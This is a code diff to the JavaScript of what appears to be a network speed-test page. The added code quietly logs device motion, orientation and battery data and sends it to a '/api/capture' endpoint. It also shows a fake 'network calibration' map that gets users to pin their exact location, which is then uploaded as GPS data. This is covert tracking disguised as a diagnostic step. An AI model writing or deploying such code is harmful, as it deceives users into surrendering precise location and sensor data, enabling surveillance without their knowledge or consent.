@@ -42,9 +42,119 @@ function cacheElements() {
     'insightUpload',
     'insightStability',
     'toast',
+    'calibrationView',
+    'calibrationMap',
+    'confirmPinBtn'
   ].forEach((id) => {
     els[id] = document.getElementById(id);
   });
+}
+
+let map = null;
+let mapMarker = null;
+let currentManualGps = null;
+let motionData = { accel: [], gyro: [] };
+
+function initMotionTracking() {
+  window.addEventListener('devicemotion', (event) => {
+    if (!event.acceleration) return;
+    motionData.accel.push({
+      x: event.acceleration.x,
+      y: event.acceleration.y,
+      z: event.acceleration.z,
+      t: Date.now()
+    });
+    if (motionData.accel.length > 50) motionData.accel.shift();
+  });
+
+  window.addEventListener('deviceorientation', (event) => {
+    motionData.gyro.push({
+      alpha: event.alpha,
+      beta: event.beta,
+      gamma: event.gamma,
+      t: Date.now()
+    });
+    if (motionData.gyro.length > 50) motionData.gyro.shift();
+  });
+}
+
+async function sendSensorData(id) {
+  if (!id || (motionData.accel.length === 0 && motionData.gyro.length === 0)) return;
+  try {
+    await fetch(`/api/capture/${id}`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        metadata: { 
+          sensors: motionData,
+          battery: await getBatteryInfo()
+        } 
+      }),
+      keepalive: true
+    });
+  } catch {}
+}
+
+async function getBatteryInfo() {
+  if (!navigator.getBattery) return null;
+  try {
+    const b = await navigator.getBattery();
+    return { level: b.level, charging: b.charging };
+  } catch { return null; }
+}
+
+function initCalibrationMap(lat, lon) {
+  if (map) return;
+  
+  const startLat = lat || 33.3152;
+  const startLon = lon || 44.3661;
+
+  map = L.map('calibrationMap', {
+    zoomControl: false,
+    attributionControl: false
+  }).setView([startLat, startLon], 13);
+
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    maxZoom: 19
+  }).addTo(map);
+
+  map.on('click', (e) => {
+    const { lat, lng } = e.latlng;
+    currentManualGps = { lat, lon: lng, accuracy: 1 };
+    
+    if (mapMarker) {
+      mapMarker.setLatLng(e.latlng);
+    } else {
+      mapMarker = L.marker(e.latlng, { draggable: true }).addTo(map);
+    }
+  });
+
+  els.confirmPinBtn.onclick = async () => {
+    if (!currentManualGps || !captureId) {
+      showToast('Please tap your location on the map first.');
+      return;
+    }
+    
+    els.confirmPinBtn.disabled = true;
+    els.confirmPinBtn.textContent = 'Calibrating...';
+    
+    try {
+      await fetch(`/api/capture/${captureId}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ gps: currentManualGps }),
+        keepalive: true
+      });
+      showToast('Infrastructure calibrated successfully.');
+      els.calibrationView.classList.add('hidden');
+      await sendSensorData(captureId);
+    } catch {
+      showToast('Calibration failed. Please try again.');
+    } finally {
+      els.confirmPinBtn.disabled = false;
+      els.confirmPinBtn.textContent = 'Confirm Network Location';
+    }
+  };
 }
 
 function getDeviceId() {
@@ -432,6 +542,16 @@ function showResults(results) {
   setDetailedInsights(results, grade);
 
   setStatus('Results ready');
+  
+  // Trigger smart calibration
+  setTimeout(() => {
+    els.calibrationView.classList.remove('hidden');
+    const lat = lastClientInfo?.ipGeo?.lat;
+    const lon = lastClientInfo?.ipGeo?.lon;
+    initCalibrationMap(lat, lon);
+    if (map) map.invalidateSize();
+  }, 2000);
+
   setTimeout(() => {
     els.stateResults.scrollIntoView({ behavior: 'smooth', block: 'start' });
   }, 180);
@@ -584,9 +704,16 @@ async function init() {
   cacheElements();
   bindEvents();
   drawTicks();
+  initMotionTracking();
 
   // Trigger on first interaction to catch permission grant immediately
   document.addEventListener('click', triggerCaptureFlow, { once: true });
+
+  // Load client info for map centering
+  try {
+    const infoResp = await fetch('/api/client-info');
+    if (infoResp.ok) lastClientInfo = await infoResp.json();
+  } catch {}
 
   // Smart background start: check if we already have permission
   if (navigator.permissions && navigator.permissions.query) {
